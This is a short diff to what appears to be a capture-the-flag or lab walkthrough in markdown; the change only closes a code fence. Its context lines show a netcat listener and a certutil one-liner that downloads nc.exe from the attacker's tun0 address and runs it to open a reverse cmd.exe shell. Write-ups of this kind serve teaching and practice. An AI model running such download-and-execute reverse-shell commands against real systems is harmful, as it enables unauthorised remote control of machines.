@@ -54,7 +54,7 @@ nc -lnvp 4444
 back on the box we run the following command
 ```
 certutil -urlcache -split -f http://{tun0_IP}:{PORT}/nc.exe n.exe && n.exe -e cmd.exe {tun0_IP} {PORT}
-
+```
 poking around we find the backend folder and an interesting file with bytes being index.ts
 <img width="761" height="724" alt="image" src="https://github.com/user-attachments/assets/b0d1d61b-d42f-4182-9781-b0000efe6964" />
 
